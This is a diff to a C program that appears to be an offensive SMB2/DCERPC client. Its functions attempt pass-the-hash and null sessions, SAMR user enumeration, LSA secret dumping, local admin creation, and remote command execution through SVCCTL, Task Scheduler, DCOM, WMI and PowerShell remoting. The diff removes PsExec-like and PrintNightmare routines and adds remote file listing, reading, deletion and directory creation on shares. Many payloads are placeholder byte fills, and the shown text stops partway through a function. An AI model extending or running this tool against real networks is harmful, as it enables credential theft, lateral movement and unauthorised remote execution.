@@ -33,6 +33,8 @@ typedef struct _SMB2Header {
 #define SMB2_READ            0x0008
 #define SMB2_WRITE           0x0009
 #define SMB2_IOCTL           0x000B
+#define SMB2_QUERY_DIRECTORY 0x000E
+#define SMB2_SET_INFO        0x000A
 
 #define STATUS_SUCCESS                0x00000000
 #define STATUS_INVALID_PARAMETER      0xC000000D
@@ -233,6 +235,36 @@ typedef struct _SMB2IOCTLResponse {
     uint32_t Flags;
     uint32_t Reserved2;
 } SMB2IOCTLResponse;
+
+typedef struct _SMB2QueryDirectoryRequest {
+    uint16_t StructureSize;
+    uint8_t  FileInformationClass;
+    uint8_t  Flags;
+    uint32_t FileIndex;
+    uint64_t FileIdPersistent;
+    uint64_t FileIdVolatile;
+    uint16_t FileNameOffset;
+    uint16_t FileNameLength;
+    uint32_t OutputBufferLength;
+} SMB2QueryDirectoryRequest;
+
+typedef struct _SMB2QueryDirectoryResponse {
+    uint16_t StructureSize;
+    uint16_t OutputBufferOffset;
+    uint32_t OutputBufferLength;
+} SMB2QueryDirectoryResponse;
+
+typedef struct _SMB2SetInfoRequest {
+    uint16_t StructureSize;
+    uint8_t  InfoType;
+    uint8_t  FileInfoClass;
+    uint32_t BufferLength;
+    uint16_t BufferOffset;
+    uint16_t Reserved;
+    uint64_t FileIdPersistent;
+    uint64_t FileIdVolatile;
+} SMB2SetInfoRequest;
+
 #pragma pack(pop)
 
 static uint64_t gMessageId = 1;
@@ -247,71 +279,14 @@ static uint64_t gFileFidPersistent = 0;
 static uint64_t gFileFidVolatile   = 0;
 static uint32_t gFileTreeId        = 0;
 
-static void parseSMB2NegotiateResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2NegotiateResponse)) {
-        SMB2NegotiateResponse *r = (SMB2NegotiateResponse *)buf;
-        printf("[Data] SMB2NegotiateResponse - Dialect:0x%04X Capabilities:0x%08X\n", r->DialectRevision, r->Capabilities);
+static void parseDCERPCResponse(const unsigned char *buf, size_t len) {
+    printf("[Client] DCERPC response length=%zu\n", len);
+    if (len == 0) return;
+    for (size_t i = 0; i < len; i++) {
+        if (i % 16 == 0) printf("\n");
+        printf("%02X ", buf[i]);
     }
-}
-
-static void parseSMB2SessionSetupResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2SessionSetupResponse)) {
-        SMB2SessionSetupResponse *r = (SMB2SessionSetupResponse*)buf;
-        printf("[Data] SMB2SessionSetupResponse - SessionFlags:0x%04X SecBufLen:%u\n", r->SessionFlags, r->SecurityBufferLength);
-    }
-}
-
-static void parseSMB2TreeConnectResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2TreeConnectResponse)) {
-        SMB2TreeConnectResponse *r = (SMB2TreeConnectResponse*)buf;
-        printf("[Data] SMB2TreeConnectResponse - ShareType:%u Capabilities:0x%08X\n", r->ShareType, r->Capabilities);
-    }
-}
-
-static void parseSMB2CreateResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2CreateResponse)) {
-        SMB2CreateResponse *r = (SMB2CreateResponse*)buf;
-        printf("[Data] SMB2CreateResponse - CreateAction:0x%08X EOF:%llu\n", r->CreateAction, (unsigned long long)r->EndofFile);
-    }
-}
-
-static void parseSMB2WriteResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2WriteResponse)) {
-        SMB2WriteResponse *r = (SMB2WriteResponse*)buf;
-        printf("[Data] SMB2WriteResponse - Count:%u\n", r->Count);
-    }
-}
-
-static void parseSMB2ReadResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2ReadResponse)) {
-        SMB2ReadResponse *r = (SMB2ReadResponse*)buf;
-        printf("[Data] SMB2ReadResponse - DataLength:%u\n", r->DataLength);
-    }
-}
-
-static void parseSMB2CloseResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2CloseResponse)) {
-        SMB2CloseResponse *r = (SMB2CloseResponse*)buf;
-        printf("[Data] SMB2CloseResponse - Flags:0x%04X Attributes:0x%08X\n", r->Flags, r->FileAttributes);
-    }
-}
-
-static void parseSMB2IOCTLResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= (ssize_t)sizeof(SMB2IOCTLResponse)) {
-        SMB2IOCTLResponse *r = (SMB2IOCTLResponse*)buf;
-        printf("[Data] SMB2IOCTLResponse - CtlCode:0x%08X InCount:%u OutCount:%u\n",
-               r->CtlCode, r->InputCount, r->OutputCount);
-    }
-}
-
-static void parseDCERPCResponse(const unsigned char* buf, ssize_t len) {
-    if (len >= 4) {
-        printf("[Data] DCERPC/Pipe data: first bytes: ");
-        for (int i = 0; i < 4; i++) {
-            printf("%02X ", buf[i]);
-        }
-        printf("\n");
-    }
+    printf("\n");
 }
 
 int sendSMB2Request(SMB2Header *hdr, const void *payload, size_t payloadLen) {
@@ -401,7 +376,6 @@ int doNegotiate() {
         return -1;
     }
     printf("[Client] SMB2 NEGOTIATE OK. payloadLen=%zd\n", payloadLen);
-    parseSMB2NegotiateResponse(buf, payloadLen);
     return 0;
 }
 
@@ -422,7 +396,6 @@ int doSessionSetup() {
     }
     gSessionId = respHdr.SessionId;
     printf("[Client] SMB2 SESSION_SETUP OK. SessionId=0x%llx\n",(unsigned long long)gSessionId);
-    parseSMB2SessionSetupResponse(buf, payloadLen);
     return 0;
 }
 
@@ -461,7 +434,6 @@ int doTreeConnect(const char *ipcPath) {
     }
     gTreeId = respHdr.TreeId;
     printf("[Client] TREE_CONNECT to %s OK. TreeId=0x%08X\n", ipcPath, gTreeId);
-    parseSMB2TreeConnectResponse(buf, payloadLen);
     return 0;
 }
 
@@ -511,7 +483,6 @@ int doOpenPipe(const char *pipeName) {
     gPipeFidVolatile   = cres->FileIdVolatile;
     printf("[Client] Named pipe '%s' opened OK. FID=(%llx:%llx)\n",
            pipeName, (unsigned long long)gPipeFidPersistent, (unsigned long long)gPipeFidVolatile);
-    parseSMB2CreateResponse(buf, payloadLen);
     return 0;
 }
 
@@ -543,7 +514,10 @@ int doWritePipe(const unsigned char *data, size_t dataLen) {
         fprintf(stderr, "WritePipe failed, status=0x%08X\n", respHdr.Status);
         return -1;
     }
-    parseSMB2WriteResponse(buf, payloadLen);
+    if (payloadLen < (ssize_t)sizeof(SMB2WriteResponse)) {
+        fprintf(stderr, "WriteResponse too small\n");
+        return -1;
+    }
     SMB2WriteResponse *wres = (SMB2WriteResponse *)buf;
     printf("[Client] Wrote %u bytes to pipe.\n", wres->Count);
     return 0;
@@ -567,7 +541,6 @@ int doReadPipe(unsigned char *outBuf, size_t outBufSize, uint32_t *outBytesRead)
         fprintf(stderr, "ReadPipe failed, status=0x%08X\n", respHdr.Status);
         return -1;
     }
-    parseSMB2ReadResponse(buf, payloadLen);
     if (payloadLen < (ssize_t)sizeof(SMB2ReadResponse)) {
         fprintf(stderr, "ReadResponse too small\n");
         return -1;
@@ -579,7 +552,6 @@ int doReadPipe(unsigned char *outBuf, size_t outBufSize, uint32_t *outBytesRead)
         if (rres->DataOffset + dataLen <= (uint32_t)payloadLen) {
             if (dataLen > outBufSize) dataLen = (uint32_t)outBufSize;
             memcpy(outBuf, dataStart, dataLen);
-            parseDCERPCResponse(dataStart, dataLen);
         } else {
             fprintf(stderr, "Data offset/length out of payload bounds!\n");
             return -1;
@@ -610,7 +582,6 @@ int doClosePipe() {
         fprintf(stderr, "ClosePipe failed, status=0x%08X\n", respHdr.Status);
         return -1;
     }
-    parseSMB2CloseResponse(buf, payloadLen);
     printf("[Client] SMB2 Close on pipe handle OK.\n");
     return 0;
 }
@@ -620,7 +591,14 @@ int doDCERPCBind() {
         0x05, 0x00, 0x0B, 0x10, 0x00, 0x00, 0x00, 0x00
     };
     printf("[Client] Sending partial DCERPC bind stub...\n");
-    return doWritePipe(dcerpcBindStub, sizeof(dcerpcBindStub));
+    if (doWritePipe(dcerpcBindStub, sizeof(dcerpcBindStub)) < 0) return -1;
+    {
+        unsigned char rb[1024];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doSVCCTLCreateService(const char *serviceName, const char *binPath) {
@@ -640,7 +618,14 @@ int doSVCCTLCreateService(const char *serviceName, const char *binPath) {
     }
     dceRequest[index++] = 0;
     printf("[Client] Sending partial CreateService stub...\n");
-    return doWritePipe(dceRequest, index);
+    if (doWritePipe(dceRequest, index) < 0) return -1;
+    {
+        unsigned char rb[1024];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doSRVSVCNetShareEnum() {
@@ -659,7 +644,14 @@ int doSRVSVCNetShareEnum() {
     dceRequest[idx++] = 0x03;
     dceRequest[idx++] = 0x00;
     dceRequest[idx++] = 0x00;
-    return doWritePipe(dceRequest, idx);
+    if (doWritePipe(dceRequest, idx) < 0) return -1;
+    {
+        unsigned char rb[2048];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
@@ -695,7 +687,6 @@ int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
         fprintf(stderr, "IOCTL failed, status=0x%08X\n", respHdr.Status);
         return -1;
     }
-    parseSMB2IOCTLResponse(buf, payloadLen);
     printf("[Client] SMB2 IOCTL call successful.\n");
     return 0;
 }
@@ -791,12 +782,21 @@ int doSamrEnumUsers() {
     }
     unsigned char dcerpcBind[] = { 0x05, 0x00, 0x0B, 0x10, 0x00 };
     doWritePipe(dcerpcBind, sizeof(dcerpcBind));
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     unsigned char dcerpcEnumStub[64];
     memset(dcerpcEnumStub, 0x53, sizeof(dcerpcEnumStub));
     doWritePipe(dcerpcEnumStub, sizeof(dcerpcEnumStub));
-    unsigned char readBuf[256];
-    uint32_t bytesRead;
-    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] SAMR enumeration attempt finished.\n");
     return 0;
@@ -834,9 +834,12 @@ int doPrinterBug() {
     unsigned char spoolData[128];
     memset(spoolData, 0x44, sizeof(spoolData));
     doWritePipe(spoolData, sizeof(spoolData));
-    unsigned char readBuf[256];
-    uint32_t bytesRead;
-    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    {
+        unsigned char rb[256];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] Printer bug attempt completed.\n");
     return 0;
@@ -850,9 +853,12 @@ int doRemoteRegistryOpen() {
     unsigned char registryStub[64];
     memset(registryStub, 0x49, sizeof(registryStub));
     doWritePipe(registryStub, sizeof(registryStub));
-    unsigned char readBuf[256];
-    uint32_t bytesRead;
-    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    {
+        unsigned char rb[256];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] Remote registry open attempt completed.\n");
     return 0;
@@ -901,7 +907,6 @@ int doNullSession() {
     }
     gSessionId = respHdr.SessionId;
     printf("[Client] Null session established. SessionId=0x%llx\n", (unsigned long long)gSessionId);
-    parseSMB2SessionSetupResponse(buf, payloadLen);
     return 0;
 }
 
@@ -933,7 +938,6 @@ int doPassTheHashSession(const char *nthash) {
     }
     gSessionId = respHdr.SessionId;
     printf("[Client] Pass-the-hash session established. SessionId=0x%llx\n", (unsigned long long)gSessionId);
-    parseSMB2SessionSetupResponse(buf, payloadLen);
     return 0;
 }
 
@@ -950,9 +954,12 @@ int doNamedPipeImpersonation() {
     unsigned char impersonationData[64];
     memset(impersonationData, 0x50, sizeof(impersonationData));
     doWritePipe(impersonationData, sizeof(impersonationData));
-    unsigned char readBuf[256];
-    uint32_t bytesRead;
-    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    {
+        unsigned char rb[256];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] Named pipe impersonation attempt completed.\n");
     return 0;
@@ -1015,7 +1022,14 @@ int doSVCCTLStartService(const char *serviceName) {
     }
     dceRequest[idx++] = 0;
     printf("[Client] Attempting to start service: %s\n", serviceName);
-    return doWritePipe(dceRequest, idx);
+    if (doWritePipe(dceRequest, idx) < 0) return -1;
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doSVCCTLStopService(const char *serviceName) {
@@ -1031,7 +1045,14 @@ int doSVCCTLStopService(const char *serviceName) {
     }
     dceRequest[idx++] = 0;
     printf("[Client] Attempting to stop service: %s\n", serviceName);
-    return doWritePipe(dceRequest, idx);
+    if (doWritePipe(dceRequest, idx) < 0) return -1;
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doSVCCTLDeleteService(const char *serviceName) {
@@ -1047,7 +1068,14 @@ int doSVCCTLDeleteService(const char *serviceName) {
     }
     dceRequest[idx++] = 0;
     printf("[Client] Attempting to delete service: %s\n", serviceName);
-    return doWritePipe(dceRequest, idx);
+    if (doWritePipe(dceRequest, idx) < 0) return -1;
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doSVCCTLRemoteExec(const char *cmd) {
@@ -1109,6 +1137,12 @@ int doAddLocalAdmin(const char *username, const char *password) {
     }
     dceRequest[idx++] = 0;
     doWritePipe(dceRequest, idx);
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] Attempted to create local admin: %s\n", username);
     return 0;
@@ -1122,15 +1156,13 @@ int doDumpLSASecrets() {
     unsigned char lsaRequest[64];
     memset(lsaRequest, 0x52, sizeof(lsaRequest));
     doWritePipe(lsaRequest, sizeof(lsaRequest));
-    unsigned char readBuf[512];
-    uint32_t bytesRead = 0;
-    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
-    doClosePipe();
-    if (bytesRead > 0) {
-        printf("[Client] Potential LSA secret data read.\n");
-    } else {
-        printf("[Client] No LSA secrets returned.\n");
+    {
+        unsigned char readBuf[512];
+        uint32_t bytesRead = 0;
+        doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+        if (bytesRead) parseDCERPCResponse(readBuf, bytesRead);
     }
+    doClosePipe();
     return 0;
 }
 
@@ -1370,7 +1402,6 @@ int doCreateFileOnShare(const char *filename, uint32_t treeId, uint64_t sessionI
     *fidVolatile = cres->FileIdVolatile;
     printf("[Client] File '%s' created/overwritten. FID=(%llx:%llx)\n",
            filename, (unsigned long long)*fidPersist, (unsigned long long)*fidVolatile);
-    parseSMB2CreateResponse(buf, payloadLen);
     return 0;
 }
 
@@ -1404,7 +1435,10 @@ int doWriteFileOnShare(const unsigned char *data, size_t dataLen,
         fprintf(stderr, "WriteFileOnShare failed, status=0x%08X\n", respHdr.Status);
         return -1;
     }
-    parseSMB2WriteResponse(buf, payloadLen);
+    if (payloadLen < (ssize_t)sizeof(SMB2WriteResponse)) {
+        fprintf(stderr, "WriteResponse too small\n");
+        return -1;
+    }
     SMB2WriteResponse *wres = (SMB2WriteResponse *)buf;
     printf("[Client] Wrote %u bytes to file.\n", wres->Count);
     return 0;
@@ -1431,7 +1465,6 @@ int doCloseFileOnShare(uint64_t fidPersist, uint64_t fidVolatile,
         fprintf(stderr, "CloseFileOnShare failed, status=0x%08X\n", respHdr.Status);
         return -1;
     }
-    parseSMB2CloseResponse(buf, payloadLen);
     printf("[Client] SMB2 Close on file handle OK.\n");
     return 0;
 }
@@ -1510,7 +1543,14 @@ int doSVCCTLListServices() {
     dceRequest[idx++] = 0x00;
     dceRequest[idx++] = 0x99;
     dceRequest[idx++] = 0x01;
-    return doWritePipe(dceRequest, idx);
+    if (doWritePipe(dceRequest, idx) < 0) return -1;
+    {
+        unsigned char rb[1024];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doSVCCTLQueryService(const char *serviceName) {
@@ -1525,7 +1565,14 @@ int doSVCCTLQueryService(const char *serviceName) {
         dceRequest[idx++] = (unsigned char)serviceName[i];
     }
     dceRequest[idx++] = 0;
-    return doWritePipe(dceRequest, idx);
+    if (doWritePipe(dceRequest, idx) < 0) return -1;
+    {
+        unsigned char rb[1024];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
+    return 0;
 }
 
 int doSCHRPCRemoteExec(const char *cmd) {
@@ -1546,6 +1593,12 @@ int doSCHRPCRemoteExec(const char *cmd) {
     }
     schReq[idx++] = 0;
     doWritePipe(schReq, idx);
+    {
+        unsigned char rb[1024];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] SCHRPC (Task Scheduler) remote exec: %s\n", cmd);
     return 0;
@@ -1578,6 +1631,12 @@ int doDCOMExec(const char *cmd) {
     }
     dcomReq[idx++] = 0;
     doWritePipe(dcomReq, idx);
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] DCOM-based execution attempt: %s\n", cmd);
     return 0;
@@ -1601,46 +1660,406 @@ int doWMIExec(const char *cmd) {
     }
     wmiReq[idx++] = 0;
     doWritePipe(wmiReq, idx);
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
     printf("[Client] WMI-based execution attempt: %s\n", cmd);
     return 0;
 }
 
-int doPSExec(const char *exePath) {
-    printf("[Client] doPSExec invoked with exePath=%s\n", exePath);
-    const char *svcName = "PXESVC";
-    if (doSVCCTLCreateService(svcName, exePath) < 0) {
-        fprintf(stderr, "Failed to create service for PsExec-like run.\n");
-        return -1;
-    }
-    if (doSVCCTLStartService(svcName) < 0) {
-        fprintf(stderr, "Failed to start service for PsExec-like run.\n");
-    }
-    if (doSVCCTLDeleteService(svcName) < 0) {
-        fprintf(stderr, "Failed to delete service.\n");
-        return -1;
-    }
-    printf("[Client] PsExec-like run completed for %s.\n", exePath);
-    return 0;
-}
-
-/* New function added to demonstrate a spooler-related escalation attempt. Minimal code shown. */
-int doPrintNightmare() {
-    if (doOpenPipe("\\PIPE\\spoolss") < 0) {
-        fprintf(stderr, "Failed to open spoolss pipe for potential PrintNightmare.\n");
+int doPowerShellRemotingExec(const char *cmd) {
+    if (doOpenPipe("\\PIPE\\PSRemoting") < 0) {
+        fprintf(stderr, "Failed to open PSRemoting pipe.\n");
         return -1;
     }
     doDCERPCBind();
-    unsigned char exploitData[128];
-    memset(exploitData, 0x50, sizeof(exploitData));
-    doWritePipe(exploitData, sizeof(exploitData));
-    unsigned char readBuf[256];
-    uint32_t bytesRead;
-    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    unsigned char psRem[512];
+    memset(psRem, 0, sizeof(psRem));
+    size_t idx = 0;
+    psRem[idx++] = 0x05;
+    psRem[idx++] = 0x00;
+    psRem[idx++] = 0x00;
+    psRem[idx++] = 0x80;
+    for (size_t i = 0; i < strlen(cmd) && idx < 510; i++) {
+        psRem[idx++] = (unsigned char)cmd[i];
+    }
+    psRem[idx++] = 0;
+    doWritePipe(psRem, idx);
+    {
+        unsigned char rb[512];
+        uint32_t br = 0;
+        doReadPipe(rb, sizeof(rb), &br);
+        if (br) parseDCERPCResponse(rb, br);
+    }
     doClosePipe();
-    printf("[Client] doPrintNightmare attempt completed.\n");
+    printf("[Client] PowerShell Remoting attempt: %s\n", cmd);
     return 0;
 }
+
+/* ---------------- New Enhanced Filesystem Functions Below ---------------- */
+
+/* Query Directory for listing. Minimal approach (doesn't handle large results). */
+int doListDirectory(const char *directoryPath, uint32_t treeId, uint64_t sessionId) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_QUERY_DIRECTORY, treeId, sessionId, &hdr);
+
+    /* First create/open the directory */
+    uint64_t dirFidPersist = 0, dirFidVolatile = 0;
+    if (doCreateFileOnShare(directoryPath, treeId, sessionId, &dirFidPersist, &dirFidVolatile) < 0) {
+        return -1;
+    }
+
+    SMB2QueryDirectoryRequest qreq;
+    memset(&qreq, 0, sizeof(qreq));
+    qreq.StructureSize         = 33;
+    qreq.FileInformationClass  = 0x01; /* FileDirectoryInformation */
+    qreq.Flags                 = 0x00;
+    qreq.FileIdPersistent      = dirFidPersist;
+    qreq.FileIdVolatile        = dirFidVolatile;
+    qreq.FileNameOffset        = sizeof(SMB2QueryDirectoryRequest);
+    uint16_t nameLen = 2; /* wildcard "*", in unicode */
+    qreq.FileNameLength = nameLen;
+    qreq.OutputBufferLength = 4096;
+
+    size_t reqSize = sizeof(qreq) + nameLen;
+    unsigned char *reqBuf = (unsigned char *)malloc(reqSize);
+    if (!reqBuf) return -1;
+    memcpy(reqBuf, &qreq, sizeof(qreq));
+    /* Simple widechar '*' */
+    reqBuf[sizeof(qreq)]     = '*';
+    reqBuf[sizeof(qreq) + 1] = 0x00;
+
+    if (sendSMB2Request(&hdr, reqBuf, reqSize) < 0) {
+        free(reqBuf);
+        return -1;
+    }
+    free(reqBuf);
+
+    SMB2Header respHdr;
+    unsigned char buf[8192];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        doCloseFileOnShare(dirFidPersist, dirFidVolatile, treeId, sessionId);
+        return -1;
+    }
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "QueryDirectory failed, status=0x%08X\n", respHdr.Status);
+        doCloseFileOnShare(dirFidPersist, dirFidVolatile, treeId, sessionId);
+        return -1;
+    }
+
+    if (payloadLen < (ssize_t)sizeof(SMB2QueryDirectoryResponse)) {
+        fprintf(stderr, "QueryDirectory response too small\n");
+        doCloseFileOnShare(dirFidPersist, dirFidVolatile, treeId, sessionId);
+        return -1;
+    }
+    SMB2QueryDirectoryResponse *qdres = (SMB2QueryDirectoryResponse *)buf;
+    uint16_t offset = qdres->OutputBufferOffset;
+    uint32_t length = qdres->OutputBufferLength;
+
+    if (offset + length <= (uint32_t)payloadLen) {
+        unsigned char *entries = buf + offset;
+        printf("[Client] Directory listing for '%s':\n", directoryPath);
+        size_t pos = 0;
+        while (pos < length) {
+            /* FILE_DIRECTORY_INFORMATION structure layout:
+               DWORD NextEntryOffset
+               DWORD FileIndex
+               LARGE_INTEGER CreationTime
+               LARGE_INTEGER LastAccessTime
+               LARGE_INTEGER LastWriteTime
+               LARGE_INTEGER ChangeTime
+               LARGE_INTEGER EndOfFile
+               LARGE_INTEGER AllocationSize
+               ULONG FileAttributes
+               ULONG FileNameLength
+               WCHAR FileName[1]
+            */
+            if (pos + 64 > length) break;
+            uint32_t nextOffset = *(uint32_t*)(entries + pos);
+            uint32_t nameLen = *(uint32_t*)(entries + pos + 56);
+            if (pos + 64 + nameLen > length) break;
+            unsigned char *namePtr = entries + pos + 60;
+            char fileName[512];
+            memset(fileName, 0, sizeof(fileName));
+            int i;
+            for (i = 0; i < (int)nameLen && i < 510; i += 2) {
+                fileName[i/2] = namePtr[i];
+            }
+            printf("  %s\n", fileName);
+            if (nextOffset == 0) break;
+            pos += nextOffset;
+        }
+    } else {
+        fprintf(stderr, "Directory listing data out of bounds.\n");
+    }
+
+    doCloseFileOnShare(dirFidPersist, dirFidVolatile, treeId, sessionId);
+    return 0;
+}
+
+/* Read an entire file in chunks, store locally. */
+int doReadFileFromShare(const char *remotePath, const char *localPath,
+                        uint32_t treeId, uint64_t sessionId) {
+    int localFd = open(localPath, O_CREAT | O_WRONLY | O_TRUNC, 0600);
+    if (localFd < 0) {
+        perror("open local file");
+        return -1;
+    }
+
+    uint64_t fidPersist = 0, fidVolatile = 0;
+    if (doCreateFileOnShare(remotePath, treeId, sessionId, &fidPersist, &fidVolatile) < 0) {
+        close(localFd);
+        return -1;
+    }
+
+    size_t totalRead = 0;
+    while (1) {
+        SMB2Header hdr;
+        buildSMB2Header(SMB2_READ, treeId, sessionId, &hdr);
+        SMB2ReadRequest rreq;
+        memset(&rreq, 0, sizeof(rreq));
+        rreq.StructureSize     = 49;
+        rreq.Length            = 4096;
+        rreq.Offset            = totalRead;
+        rreq.FileIdPersistent  = fidPersist;
+        rreq.FileIdVolatile    = fidVolatile;
+
+        if (sendSMB2Request(&hdr, &rreq, sizeof(rreq)) < 0) {
+            break;
+        }
+        SMB2Header respHdr;
+        unsigned char buf[8192];
+        ssize_t payloadLen;
+        if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+            break;
+        }
+        if (respHdr.Status == 0x80000006) {
+            /* STATUS_END_OF_FILE */
+            printf("[Client] Reached EOF.\n");
+            break;
+        }
+        if (respHdr.Status != STATUS_SUCCESS) {
+            fprintf(stderr, "ReadFileFromShare failed, status=0x%08X\n", respHdr.Status);
+            break;
+        }
+        if (payloadLen < (ssize_t)sizeof(SMB2ReadResponse)) {
+            fprintf(stderr, "ReadResponse too small\n");
+            break;
+        }
+        SMB2ReadResponse *rres = (SMB2ReadResponse *)buf;
+        uint32_t dataLen = rres->DataLength;
+        if (dataLen == 0) {
+            printf("[Client] Zero bytes read, possibly EOF.\n");
+            break;
+        }
+        unsigned char *dataStart = buf + rres->DataOffset;
+        if (rres->DataOffset + dataLen <= (uint32_t)payloadLen) {
+            write(localFd, dataStart, dataLen);
+            totalRead += dataLen;
+        } else {
+            fprintf(stderr, "Data offset/length out of payload bounds!\n");
+            break;
+        }
+    }
+
+    doCloseFileOnShare(fidPersist, fidVolatile, treeId, sessionId);
+    close(localFd);
+    printf("[Client] Finished reading remote file '%s' to '%s', total=%zu bytes.\n", remotePath, localPath, totalRead);
+    return 0;
+}
+
+/* Delete file on share using SMB2_SET_INFO and FileDispositionInformation. */
+int doDeleteFileOnShare(const char *remotePath,
+                        uint32_t treeId, uint64_t sessionId) {
+    uint64_t fidPersist = 0, fidVolatile = 0;
+    if (doCreateFileOnShare(remotePath, treeId, sessionId, &fidPersist, &fidVolatile) < 0) {
+        return -1;
+    }
+
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_SET_INFO, treeId, sessionId, &hdr);
+    SMB2SetInfoRequest sreq;
+    memset(&sreq, 0, sizeof(sreq));
+    sreq.StructureSize     = 33;
+    sreq.InfoType          = 0x01; /* SMB2_0_INFO_FILE */
+    sreq.FileInfoClass     = 0x0D; /* FileDispositionInformation */
+    sreq.BufferLength      = 1;
+    sreq.BufferOffset      = sizeof(SMB2SetInfoRequest);
+    sreq.FileIdPersistent  = fidPersist;
+    sreq.FileIdVolatile    = fidVolatile;
+
+    unsigned char reqBuf[sizeof(sreq) + 1];
+    memcpy(reqBuf, &sreq, sizeof(sreq));
+    reqBuf[sizeof(sreq)] = 1; /* DeletePending = 1 */
+
+    if (sendSMB2Request(&hdr, reqBuf, sizeof(reqBuf)) < 0) {
+        doCloseFileOnShare(fidPersist, fidVolatile, treeId, sessionId);
+        return -1;
+    }
+
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        doCloseFileOnShare(fidPersist, fidVolatile, treeId, sessionId);
+        return -1;
+    }
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "SetInfo to delete file failed, status=0x%08X\n", respHdr.Status);
+    }
+
+    doCloseFileOnShare(fidPersist, fidVolatile, treeId, sessionId);
+    printf("[Client] Requested deletion of '%s'.\n", remotePath);
+    return 0;
+}
+
+/* Create a directory on share by using appropriate CreateOptions. */
+int doCreateDirectoryOnShare(const char *dirPath, uint32_t treeId, uint64_t sessionId) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_CREATE, treeId, sessionId, &hdr);
+    SMB2CreateRequest creq;
+    memset(&creq, 0, sizeof(creq));
+    creq.StructureSize        = 57;
+    creq.RequestedOplockLevel = 0;
+    creq.ImpersonationLevel   = 2;
+    creq.DesiredAccess        = 0x0012019F;
+    creq.FileAttributes       = 0x00000010; /* FILE_ATTRIBUTE_DIRECTORY */
+    creq.ShareAccess          = 0x00000007;
+    creq.CreateDisposition    = 0x00000001; /* FILE_SUPERSEDE */
+    creq.CreateOptions        = 0x00000001; /* FILE_DIRECTORY_FILE */
+    creq.NameOffset           = sizeof(SMB2CreateRequest);
+    uint32_t pathLenBytes = (uint32_t)(strlen(dirPath) * 2);
+    creq.NameLength = (uint16_t)pathLenBytes;
+
